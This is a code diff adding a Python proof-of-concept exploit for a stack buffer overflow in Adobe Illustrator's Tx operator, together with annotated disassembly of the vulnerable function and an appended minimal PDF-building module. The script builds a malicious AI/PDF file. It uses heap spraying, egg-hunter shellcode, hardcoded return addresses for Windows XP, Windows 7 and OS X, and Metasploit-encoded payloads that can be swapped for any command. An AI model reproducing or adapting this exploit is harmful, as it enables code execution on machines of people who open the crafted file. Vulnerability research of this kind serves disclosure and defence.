@@ -1,0 +1,735 @@
+##########################################################################
+####   Felipe Andres Manzano * felipe.andres.manzano@gmail.com        ####
+##########################################################################
+'''
+The vulnerable function follows...
+----------------------------------
+.text:004A7200 ; =============== S U B R O U T I N E =======================================
+.text:004A7200
+.text:004A7200 ; Attributes: bp-based frame
+.text:004A7200
+.text:004A7200 sub_4A7200      proc near               
+.text:004A7200
+.text:004A7200 var_11C         = dword ptr -11Ch
+.text:004A7200 var_118         = dword ptr -118h
+.text:004A7200 var_114         = byte ptr -114h
+.text:004A7200 var_14          = dword ptr -14h
+.text:004A7200 var_10          = dword ptr -10h
+.text:004A7200 var_C           = dword ptr -0Ch
+.text:004A7200 var_4           = dword ptr -4
+.text:004A7200 arg_0           = dword ptr  8
+.text:004A7200
+.text:004A7200                 push    ebp
+.text:004A7201                 mov     ebp, esp
+.text:004A7203                 push    0FFFFFFFFh
+.text:004A7205                 push    offset loc_C3B8C0
+.text:004A720A                 mov     eax, large fs:0
+.text:004A7210                 push    eax
+.text:004A7211                 sub     esp, 110h            ;Make room for a 256 bytes buffer, etc 
+.text:004A7217                 mov     eax, dword_FB3380    
+.text:004A721C                 xor     eax, ebp
+.text:004A721E                 mov     [ebp+var_14], eax    ;Cookie! Immediately after the buffer
+.text:004A7221                 push    ebx
+.text:004A7222                 push    esi
+.text:004A7223                 push    edi
+.text:004A7224                 push    eax
+.text:004A7225                 lea     eax, [ebp+var_C]
+.text:004A7228                 mov     large fs:0, eax
+.text:004A722E                 mov     [ebp+var_10], esp
+.text:004A7231                 mov     ebx, [ebp+arg_0]
+.text:004A7234                 mov     edi, ecx
+.text:004A7236                 mov     ecx, ebx
+.text:004A7238                 mov     [ebp+var_118], ebx
+.text:004A723E                 call    std::basic_string::length(...) ;Original size offending size
+                                                                      ;(It doesn;t stop at null chars)
+.text:004A7244                 mov     esi, eax
+.text:004A7246                 push    esi
+.text:004A7247                 mov     ecx, ebx
+.text:004A7249                 call    std::basic_string::c_str(...)
+.text:004A724F                 push    eax
+.text:004A7250                 lea     eax, [ebp+var_114]
+.text:004A7256                 push    eax
+.text:004A7257                 call    memcpy                     ;STACK OVERFLOW! (If more than 256 bytes)
+.text:004A725C                 lea     eax, [ebp+esi+var_114]
+.text:004A7263                 add     esp, 0Ch
+.text:004A7266                 mov     [ebp+var_11C], eax
+.text:004A726C                 mov     byte ptr [eax], 0
+.text:004A726F                 mov     [ebp+var_4], 0
+.text:004A7276                 lea     esi, [ebp+var_114]
+.text:004A727C                 lea     esp, [esp+0]
+.text:004A7280
+.text:004A7280 loc_4A7280:                             
+.text:004A7280                 cmp     esi, eax
+.text:004A7282                 jnb     short loc_4A72B6
+.text:004A7284                 mov     edx, [edi]
+.text:004A7286                 mov     eax, [edx+4]
+.text:004A7289                 push    esi
+.text:004A728A                 mov     ecx, edi
+.text:004A728C                 call    eax                       ;Iterates over the stack copied buffer
+                                                                 ;applying a 'locale'? character translation
+                                                                 ;(Invalid chars noted in exploit)
+.text:004A728E                 test    eax, eax
+.text:004A7290                 jg      short loc_4A7297
+.text:004A7292                 mov     eax, 1
+.text:004A7297
+.text:004A7297 loc_4A7297:                             
+.text:004A7297                 add     esi, eax
+.text:004A7299                 mov     eax, [ebp+var_11C]
+.text:004A729F                 jmp     short loc_4A7280
+.text:004A72AE ; ---------------------------------------------------------------------------
+.text:004A72AE
+.text:004A72AE loc_4A72AE:                             
+.text:004A72AE                 mov     ebx, [ebp+var_118]
+.text:004A72B4                 jmp     short loc_4A72BD
+.text:004A72B6 ; ---------------------------------------------------------------------------
+.text:004A72B6
+.text:004A72B6 loc_4A72B6:                             
+.text:004A72B6                 mov     [ebp+var_4], 0FFFFFFFFh
+.text:004A72BD
+.text:004A72BD loc_4A72BD:                             
+.text:004A72BD                 lea     ecx, [ebp+var_114]
+.text:004A72C3                 push    ecx
+.text:004A72C4                 mov     ecx, ebx
+.text:004A72C6                 call    std::basic_string::operator=(...)   ;Here, due to local values 
+                                                                           ;corruption it is possible to
+                                                                           ;write a translated version of
+                                                                           ;our buffer to anywhere 
+.text:004A72CC                 mov     ecx, [ebp+var_C]
+.text:004A72CF                 mov     large fs:0, ecx
+.text:004A72D6                 pop     ecx
+.text:004A72D7                 pop     edi
+.text:004A72D8                 pop     esi
+.text:004A72D9                 pop     ebx
+.text:004A72DA                 mov     ecx, [ebp+var_14]
+.text:004A72DD                 xor     ecx, ebp
+.text:004A72DF                 call    sub_C27512                           ;Check the cookie
+.text:004A72E4                 mov     esp, ebp
+.text:004A72E6                 pop     ebp
+.text:004A72E7                 retn    4
+.text:004A72E7 sub_4A7200      endp
+.text:004A72E7
+
+
+f/
+'''
+
+#Exploit PoC begins...
+from miniPDF import * #http://pastebin.com/LUTXSSvV
+import zlib,struct,os,optparse,hashlib
+from subprocess import Popen, PIPE
+#Character translation map for the copied buffer (Reversed from function 004A72F0)
+cmap=[0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,
+0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,
+0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,
+0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,
+0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,
+0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x7B,0x7C,0x7D,0x7E,0x00,
+0x80,0x00,0x82,0x83,0x84,0x85,0x86,0x87,0x88,0x89,0x8A,0x8B,0x8C,0x00,0x00,0x00,
+0x00,0x91,0x92,0x93,0x94,0x95,0x96,0x97,0x98,0x99,0x9A,0x9B,0x9C,0x00,0x00,0x9F,
+0x20,0xA1,0xA2,0xA3,0xA4,0xA5,0xA6,0xA7,0xA8,0xA9,0xAA,0xAB,0xAC,0x2D,0xAE,0xAF,
+0xB0,0xB1,0xB2,0xB3,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xBB,0xBC,0xBD,0xBE,0xBF,
+0xC0,0xC1,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,
+0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,
+0xE0,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xEB,0xEC,0xED,0xEE,0xEF,
+0xF0,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,0xFA,0xFB,0xFC,0xFD,0xFE,0xFF]
+invalid = [ i for i in xrange(0,0xff+1) if cmap[i] != i and i>0x1f]
+
+
+def getXImage(width, height, fill='\x90', tail='\xcc'):
+    '''
+        [ a b c d tx ty ] llx lly urx ury h w bits ImageType AlphaChannelCount reserved bin-ascii ImageMask XI
+        Arguments to the XI operator specify the location and size of the image, its
+        pixel bit depth, color type, and other attributes
+
+        The image matrix maps the unit square of user space, bounded by
+        (0, 0) and (1, 1) in user space, to the boundary of the source image in
+        image space.
+    '''
+
+    doc = '''0 A
+u
+0 O
+0 g
+0 J 0 j 1 w 10 M []0 d
+0 XR
+%AI5_File:
+%AI5_BeginRaster
+[$width$ 0 0 $height$ 0 0] 0 0 $width$ $height$ $width$ $height$ 8 1 0 0 $bin_ascii$ 0
+%%BeginData: $size$
+XI
+$data$
+%%EndData
+XH
+%AI5_EndRaster
+F
+U
+'''
+    bin_ascii = 1 #binary
+    doc = doc.replace('$width$','%d'%width)
+    doc = doc.replace('$height$','%d'%height)
+    doc = doc.replace('$bin_ascii$','%d'%bin_ascii)
+    doc = doc.replace('$size$','%d'%(width*height))
+    
+    data = (fill*(width*height))
+    data = data[:width*height-len(tail)]+tail
+
+    if bin_ascii == 0:
+      data = data.encode('hex')
+      data_formated = ''
+      for i in xrange(0,len(data)+62,62):
+        data_formated += '%'+data[i:i+62]+'\n'
+      data = data_formated
+    doc = doc.replace('$data$',data)
+    return doc
+
+def makeASCIICode(msfpayload):
+  msfpayload = Popen('msfpayload3.5 %s R'%msfpayload, shell=True, stdout=PIPE)
+  msfencode  = Popen("msfencode3.5 BufferRegister=EAX -e x86/alpha_mixed -b '%s' -t raw"%''.join(['\\x%02x'%x for x in invalid]), 
+                      shell=True, 
+                      stdin=msfpayload.stdout, 
+                      stdout=PIPE)
+  code = msfencode.communicate()[0]
+  return code
+  
+def mkAIPrivate(options):
+  baseai = '''
+%!PS-Adobe-3.0 
+%%Creator: Adobe Illustrator(TM) 3.2
+%%AI8_CreatorVersion: 15.0.2
+%AI5_FileFormat 11.0
+%%For: (Administrator) ()
+%%Title: (thafile.ai)
+%%CreationDate: 1/21/2011 12:32 PM
+%%Canvassize: 16383
+%%BoundingBox: 29 -389 198 75
+%%DocumentProcessColors: Black
+%%DocumentFonts: MyriadPro-Regular
+%%DocumentNeededFonts: MyriadPro-Regular
+%%DocumentNeededResources: procset Adobe_packedarray 2.0 0
+%%+ procset Adobe_cshow 1.1 0
+%%+ procset Adobe_customcolor 1.0 0
+%%+ procset Adobe_typography_AI3 1.0 1
+%%+ procset Adobe_pattern_AI3 1.0 0
+%%+ procset Adobe_Illustrator_AI3 1.0 1
+%AI3_ColorUsage: Color
+%AI3_TemplateBox: 298 -421 298 -421
+%AI3_TileBox: -8.35986 -816.9453 603.6406 -24.9448
+%AI3_DocumentPreview: None
+%%PageOrigin:-8 -817
+%AI7_GridSettings: 72 8 72 8 1 0 0.8 0.8 0.8 0.9 0.9 0.9
+%AI9_Flatten: 1
+%AI12_CMSettings: 00.MS
+%%EndComments
+%%BeginProlog
+%%IncludeResource: procset Adobe_packedarray 2.0 0
+Adobe_packedarray /initialize get exec
+%%IncludeResource: procset Adobe_cshow 1.1 0
+%%IncludeResource: procset Adobe_customcolor 1.0 0
+%%IncludeResource: procset Adobe_typography_AI3 1.0 1
+%%IncludeResource: procset Adobe_pattern_AI3 1.0 0
+%%IncludeResource: procset Adobe_Illustrator_AI3 1.0 1
+%%EndProlog
+%%BeginSetup
+%%IncludeFont: MyriadPro-Regular
+Adobe_cshow /initialize get exec
+Adobe_customcolor /initialize get exec
+Adobe_typography_AI3 /initialize get exec
+Adobe_pattern_AI3 /initialize get exec
+Adobe_Illustrator_AI3 /initialize get exec
+[
+39/quotesingle 96/grave 128/Euro 130/quotesinglbase/florin/quotedblbase/ellipsis
+/dagger/daggerdbl/circumflex/perthousand/Scaron/guilsinglleft/OE 145/quoteleft
+/quoteright/quotedblleft/quotedblright/bullet/endash/emdash/tilde/trademark
+/scaron/guilsinglright/oe/dotlessi 159/Ydieresis /space 164/currency 166/brokenbar
+168/dieresis/copyright/ordfeminine 172/logicalnot/hyphen/registered/macron/ring
+/plusminus/twosuperior/threesuperior/acute/mu 183/periodcentered/cedilla
+/onesuperior/ordmasculine 188/onequarter/onehalf/threequarters 192/Agrave
+/Aacute/Acircumflex/Atilde/Adieresis/Aring/AE/Ccedilla/Egrave/Eacute
+/Ecircumflex/Edieresis/Igrave/Iacute/Icircumflex/Idieresis/Eth/Ntilde
+/Ograve/Oacute/Ocircumflex/Otilde/Odieresis/multiply/Oslash/Ugrave
+/Uacute/Ucircumflex/Udieresis/Yacute/Thorn/germandbls/agrave/aacute
+/acircumflex/atilde/adieresis/aring/ae/ccedilla/egrave/eacute/ecircumflex
+/edieresis/igrave/iacute/icircumflex/idieresis/eth/ntilde/ograve/oacute
+/ocircumflex/otilde/odieresis/divide/oslash/ugrave/uacute/ucircumflex
+/udieresis/yacute/thorn/ydieresis
+TE
+%AI3_BeginEncoding: _MyriadPro-Regular MyriadPro-Regular
+[/_MyriadPro-Regular/MyriadPro-Regular 0 0 1 TZ
+%AI3_EndEncoding AdobeType
+%%EndSetup
+$HEAPSPRAY$
+u
+0 To
+1 0 0 1 63.9058 -54.9058 0 Tp
+TP
+1 0 0 1 63.9058 -54.9058 Tm
+0 Tr
+0 O
+0 0 0 1 k
+4 M
+/_MyriadPro-Regular 12 Tf
+100 Tz
+0 Tt
+0 0 Tl
+0 Tc
+($PATTERN$) Tx 1 0 Tk
+TO
+U
+%%PageTrailer
+gsave annotatepage grestore showpage
+%%Trailer
+Adobe_Illustrator_AI3 /terminate get exec
+Adobe_pattern_AI3 /terminate get exec
+Adobe_typography_AI3 /terminate get exec
+Adobe_customcolor /terminate get exec
+Adobe_cshow /terminate get exec
+Adobe_packedarray /terminate get exec
+%%EOF
+'''
+
+
+  #configure token and search code snipet
+  token = 0x494c4546
+
+  if options.w7:
+    #Win7 In w7 the environment memory is 0x10000bytes long!
+    msfpayload = 'windows/exec CMD=calc.exe EXITFUNC=process'
+    baseai = baseai.replace('$HEAPSPRAY$','')
+    jmp_addr = 0x00001FF01
+    write_addr = 0x0001FF01
+  elif options.xp:
+    #XPSP3
+    msfpayload = 'windows/exec CMD=calc.exe EXITFUNC=process'
+    baseai = baseai.replace('$HEAPSPRAY$','')
+    jmp_addr = 0x10F00 
+    write_addr = 0x10F00
+  elif options.osx:
+    code = Popen('msfpayload3.5 osx/x86/exec CMD=/Applications/Calculator.app/Contents/MacOS/Calculator EXITFUNC=process R', shell=True, stdout=PIPE).communicate()[0]
+    baseai = baseai.replace('$HEAPSPRAY$',getXImage(1020,1024,fill='\x90',tail='\xcc'+code+'\xcc')*300 )
+    payload = "A"*284
+    payload += struct.pack("<L", 0x31000100)
+    #Write the string in octal form
+    ai_data = baseai.replace('$PATTERN$', ''.join(['\\%o'%ord(i) for i in payload]))
+    return ai_data
+  elif options.multi:
+    msfpayload = 'windows/exec CMD=calc.exe EXITFUNC=seh'
+    jmp_addr = 0x18e41111
+    write_addr = 0xFFFF     #Segfault
+    #configure token and search code snipet
+    search = '\x80\x79\xff\x01'              #CMP BYTE [ECX-1],1
+    search += '\x74\x18'                      #JZ fixstack
+    search += '\xc6\x41\xff\x01'              #MOV BYTE [ECX-1],1
+    search += '\x58'                          #search: pop EAX
+    search += '\x3D'+struct.pack('<L',token)  #cmp EAX, $token
+    search += '\x75\xF8'                      #jnz %search
+    search += '\x89\xe0'                      #mov eax,esp 
+    search += '\x81\xec'+struct.pack("<L",0x1000) #sub esp, 0x1000
+    search += '\x89\xe5'                      #mov ebp,esp
+    search += '\xFF\xD0'                      #CALL EAX
+    ##Second crash fix stack
+    # Search for stack signature (Tested in 15.0.0 15.0.1 15.0.2)
+    # 00000045
+    # 00000001
+    # 00000000
+    # 00000045
+    search +=  '\x81\xc4'+struct.pack("<L",0x1000) #add esp, 0x1000
+    search += '\x58'                  #POP EAX
+    search += '\x40'                  #INC EAX
+    search += '\x83\xF8\x46'          #CMP EAX,46
+    search += '\x75\xF9'              #JNE SHORT loop
+    ###
+    search += '\x58'                  #POP EAX
+    search += '\x40'                  #INC EAX
+    search += '\x83\xF8\x02'          #CMP EAX,02
+    search += '\x75\xF9'              #JNE SHORT loop
+    ###
+    search += '\x58'                  #POP EAX
+    search += '\x40'                  #INC EAX
+    search += '\x83\xF8\x01'          #CMP EAX,01
+    search += '\x75\xF9'              #JNE SHORT loop
+    ###
+    search += '\x58'                  #POP EAX
+    search += '\x40'                  #INC EAX
+    search += '\x83\xF8\x46'          #CMP EAX,46
+    search += '\x75\xF9'              #JNE SHORT loop
+    #Fix frame and return
+    search += '\x83\xEC\x1C'         #SUB ESP,1C
+    search += '\x5d'                 #POP EBP
+    search += '\xc3'                 #RET
+
+    baseai = baseai.replace('$HEAPSPRAY$',getXImage(1020,1024,fill='\x90',tail=search)*300 )
+  else:
+    #DEBUG
+    def pattern(size):
+      def _pattern():
+        for i in xrange(ord('a'),ord('z')+1):
+          for j in xrange(ord('0'),ord('9')+1):
+            for k in xrange(ord('A'),ord('Z')+1):
+              for h in xrange(ord('0'),ord('9')+1):
+                yield chr(i)
+                yield chr(j)
+                yield chr(k)
+                yield chr(h)
+      return  ''.join(list(_pattern())[:size])
+    p = pattern(3000)
+    ai_data = baseai.replace('($PATTERN$)',  '('+p+')').replace('$HEAPSPRAY$',getXImage(1020,1024)*20)
+    return ai_data
+
+ #prepare shellcode..
+  if options.payload:
+    msfpayload = args[1]
+
+  code = makeASCIICode(msfpayload)
+
+  search = '\x58'                          #search: pop EAX
+  search += '\x3D'+struct.pack('<L',token)  #cmp EAX, $token
+  search += '\x75\xF8'                      #jnz %search
+  search += '\x89\xe0'                      #mov eax,esp 
+  search += '\x89\xe5'                      #mov ebp,esp
+  search += '\xFF\xD0'                      #CALL EAX
+  payload =  search 
+  payload += 'A'*(268 - len(payload))
+  payload += struct.pack('<L',jmp_addr)    #offset 268
+  payload += 'B'*(352 - len(payload))
+  payload += struct.pack('<L', write_addr) #offset 352 (originally a heap address)
+  payload += 'C'*(376 - len(payload))
+  payload += struct.pack('<L',token)       #offset 376
+  payload += code                          #offset 380
+
+  assert len(payload)<=0x3000, 'Payload too long!, it may hit the end of the stack'
+  #Double check it doesn't have invalid chars...
+  for c in search:
+    assert not ord(c) in invalid, 'c:%s is in %s'%('%02x'%ord(c),['\\x%02x'%x for x in invalid])
+  
+  #Write the string in octal form
+  ai_data = baseai.replace('$PATTERN$', ''.join(['\\%o'%ord(i) for i in payload]))
+
+  #ai_data holds the ai private data to we inserted in the pdf shell
+  return ai_data
+
+def mkPDFShell(ai_data):
+  #The document
+  doc = PDFDoc()
+  #font
+  font = PDFDict()
+  font.add('Name', PDFName('F1'))
+  font.add('Subtype', PDFName('Type1'))
+  font.add('BaseFont', PDFName('Helvetica'))
+  #name:font map
+  fontname = PDFDict()
+  fontname.add('F1',font)
+  #resources
+  resources = PDFDict()
+  resources.add('Font',fontname)
+  #contents
+  contents= PDFStream({},'BT /F1 24 Tf 240 700 Td (Pedefe Pedefeito Pedefeon!) Tj ET')
+  doc.add(contents)
+  #begin illustrator bit
+  private = PDFDict()
+  illustrator = PDFDict()
+
+  #slice the private data in 64k packs
+  data = ai_data
+  compress = {}
+  chunk_size = 0xffff*20
+  for i in xrange(0,len(data)/chunk_size+1):
+    priv_data = PDFStream({'Filter': '/FlateDecode'},data[chunk_size*i:chunk_size*(i+1)].encode('zlib'))
+    hsh = hashlib.md5(priv_data.stream)
+    if not hsh.hexdigest() in compress.keys():
+      doc.add(priv_data)
+      ref = PDFRef(priv_data)
+      compress[hsh.hexdigest()] = ref
+    private.add('AIPrivateData%d'%(i+1),ref)
+
+  private.add('NumBlock',PDFNum(len(data)/0xffff+1))
+  private.add('ContainerVersion',PDFNum(15.0))
+  private.add('CreatorVersion',PDFNum(15.0))
+  private.add('RoundtripVersion',PDFNum(15.0))
+  
+  illustrator.add('LastModified',PDFString('D:20110202124811-07\'00\''))
+  illustrator.add('Private',PDFRef(private))
+  
+  doc.add(private)
+  doc.add(illustrator)
+  #page
+  page = PDFDict()
+  page.add('Type',PDFName('Page'))
+  page.add('Resources',resources)
+  page.add('Contents', PDFRef(contents))
+  page.add('PieceInfo',PDFDict({'Illustrator': PDFRef(illustrator)})) 
+  doc.add(page)
+  #pages
+  pages = PDFDict()
+  pages.add('Type', PDFName('Pages'))
+  pages.add('Kids', PDFArray([PDFRef(page)]))
+  pages.add('Count', PDFNum(1))
+  #add parent reference in page
+  page.add('Parent',PDFRef(pages))
+  doc.add(pages)
+  #catalog
+  catalog = PDFDict()
+  catalog.add('Type', PDFName('Catalog'))
+  catalog.add('Pages', PDFRef(pages))
+  doc.add(catalog)
+  doc.setRoot(catalog)
+  return str(doc)
+
+
+if __name__ == '__main__':
+
+  parser = optparse.OptionParser(description='Adobe Illustrator File Format Tx operator Stack Overflow')
+  parser.add_option('--debug', action='store_true', default=False, help='For debugging')
+  parser.add_option('--multi', action='store_true', default=False, help='Heapspraying for multitarget')
+  parser.add_option('--w7', action='store_true', default=False, help='For Windows7')
+  parser.add_option('--xp', action='store_true', default=False, help='For Windows XP (generic)')
+  parser.add_option('--osx', action='store_true', default=False, help='For OSX (tested on plain leopard)')
+  parser.add_option('--payload',  action='store_true', default=False, help="Metasploit payload. Ex. 'windows/exec CMD=calc.exe'")
+  parser.add_option('--doc', action='store_true', default=False, help='Print detailed documentation')
+  (options, args) = parser.parse_args()
+  if not options.w7 + options.xp + options.debug + options.multi + options.osx + options.doc== 1:
+    print 'Try --help'
+    exit(-1)
+  elif options.doc:
+    print __doc__
+    exit(0)
+
+  ai_data = mkAIPrivate(options)
+  print mkPDFShell(ai_data)
+
+#f/
+
+
+########################### miniPDF.py module ############################
+
+##########################################################################
+####   Felipe Andres Manzano     *   felipe.andres.manzano@gmail.com  ####
+####   http://twitter.com/feliam *   http://wordpress.com/feliam      ####
+##########################################################################
+import struct
+
+#For constructing a minimal pdf file
+## PDF REference 3rd edition:: 3.2 Objects
+class PDFObject:
+    def __init__(self):
+        self.n=None
+        self.v=None
+    def __str__(self):
+        raise Exception("Fail")
+
+## PDF REference 3rd edition:: 3.2.1 Booleans Objects
+class PDFBool(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        if self.s:
+            return "true"
+        return "false"
+
+## PDF REference 3rd edition:: 3.2.2 Numeric Objects
+class PDFNum(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "%s"%self.s
+
+## PDF REference 3rd edition:: 3.2.3 String Objects
+class PDFString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "(%s)"%self.s
+
+## PDF REference 3rd edition:: 3.2.3 String Objects / Hexadecimal Strings
+class PDFHexString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "<" + "".join(["%02x"%ord(c) for c in self.s]) + ">"
+
+## A convenient type of literal Strings
+class PDFOctalString(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s="".join(["\\%03o"%ord(c) for c in s])
+    def __str__(self):
+        return "(%s)"%self.s
+
+## PDF REference 3rd edition:: 3.2.4 Name Objects
+class PDFName(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        self.s=s
+    def __str__(self):
+        return "/%s"%self.s
+
+## PDF REference 3rd edition:: 3.2.5 Array Objects
+class PDFArray(PDFObject):
+    def __init__(self,s):
+        PDFObject.__init__(self)
+        assert type(s) == type([])
+        self.s=s
+    def append(self,o):
+        self.s.append(o)
+        return self
+    def __str__(self):
+        return "[%s]"%(" ".join([ o.__str__() for o in self.s]))
+
+## PDF REference 3rd edition:: 3.2.6 Dictionary Objects
+class PDFDict(PDFObject):
+    def __init__(self, d={}):
+        PDFObject.__init__(self)
+        self.dict = {}
+        for k in d:
+            self.dict[k]=d[k]
+
+    def __iter__(self):
+        for k in self.dict.keys():
+            yield k
+
+    def __iterkeys__(self):
+        for k in self.dict.keys():
+            yield k
+
+    def __getitem__(self, key):
+        return self.dict[key]
+        
+    def add(self,name,obj):
+        self.dict[name] = obj
+
+    def get(self,name):
+        if name in self.dict.keys():
+            return self.dict[name]
+        else:
+            return None
+
+    def __str__(self):
+        s="<<"
+        for name in self.dict:
+            s+="%s %s "%(PDFName(name),self.dict[name])
+        s+=">>"
+        return s
+
+## PDF REference 3rd edition:: 3.2.7 Stream Objects
+class PDFStream(PDFDict):
+    def __init__(self,d={},stream=""):
+        PDFDict.__init__(self,d)
+        self.stream=stream
+        self.filtered=self.stream
+        self.add('Length', len(stream))
+        self.filters = []
+
+    def appendFilter(self, filter):
+        self.filters.append(filter)
+        self._applyFilters() #yeah every time .. so what!
+
+    def _applyFilters(self):
+        self.filtered = self.stream
+        for f in self.filters:
+                self.filtered = f.encode(self.filtered)
+        if len(self.filters)>0:
+            self.add('Length', len(self.filtered))
+            self.add('Filter', PDFArray([f.name for f in self.filters]))
+        #Add Filter parameters ?
+    def __str__(self):
+        self._applyFilters() #yeah every time .. so what!
+        s=""
+        s+=PDFDict.__str__(self)
+        s+="\nstream\n"
+        s+=self.filtered
+        s+="\nendstream"
+        return s
+
+## PDF REference 3rd edition:: 3.2.8 Null Object
+class PDFNull(PDFObject):
+    def __init__(self):
+        PDFObject.__init__(self)
+
+    def __str__(self):
+        return "null"
+
+
+## PDF REference 3rd edition:: 3.2.9 Indirect Objects
+class UnResolved(PDFObject):
+    def __init__(self,n,v):
+        PDFObject.__init__(self)
+        self.n=n
+        self.v=v
+    def __str__(self):
+        return "UNRESOLVED(%d %d)"%(self.n,self.v)
+class PDFRef(PDFObject):
+    def __init__(self,obj):
+        PDFObject.__init__(self)
+        self.obj=[obj]
+    def __str__(self):
+        if len(self.obj)==0:
+            return "null"
+        return "%d %d R"%(self.obj[0].n,self.obj[0].v)
+
+## PDF REference 3rd edition:: 3.3 Filters
+## Example Filter...
+class FlateDecode:
+    name = PDFName('FlateDecode')
+    def __init__(self):
+        pass
+    def encode(self,stream):
+        return zlib.compress(stream)
+    def decode(self,stream):
+        return zlib.decompress(stream)
+
+## PDF REference 3rd edition:: 3.4 File Structure
+## Simplest file structure...
+class PDFDoc():
+    def __init__(self,obfuscate=0):
+        self.objs=[]
+        self.info=None
+        self.root=None
+    def setRoot(self,root):
+        self.root=root
+    def setInfo(self,info):
+        self.info=info
+    def _add(self,obj):
+        if obj.v!=None or obj.n!=None:
+            raise Exception("Already added!!!")
+        obj.v=0
+        obj.n=1+len(self.objs)
+        self.objs.append(obj)
+    def add(self,obj):
+        if type(obj) != type([]):
+            self._add(obj);        
+        else:
+            for o in obj:  
+                self._add(o)
+    def _header(self):
+        return "%PDF-1.5\n%\xE7\xF3\xCF\xD3\n"
+    def __str__(self):
+        doc1 = self._header()
+        xref = {}
+        for obj in self.objs:
+            xref[obj.n] = len(doc1)
+            doc1+="%d %d obj\n"%(obj.n,obj.v)
+            doc1+=obj.__str__()
+            doc1+="\nendobj\n" 
+        posxref=len(doc1)
+        doc1+="xref\n"
+        doc1+="0 %d\n"%(len(self.objs)+1)
+        doc1+="0000000000 65535 f \n"
+        for xr in xref.keys():
+            doc1+= "%010d %05d n \n"%(xref[xr],0)
+        doc1+="trailer\n"
+        trailer =  PDFDict()
+        trailer.add("Size",len(self.objs)+1)
+        if self.root == None:
+            raise Exception("Root not set!")
+        trailer.add("Root",PDFRef(self.root))
+        if self.info:
+            trailer.add("Info",PDFRef(self.info))
+        doc1+=trailer.__str__()
+        doc1+="\nstartxref\n%d\n"%posxref
+        doc1+="%%EOF"
+        return doc1 
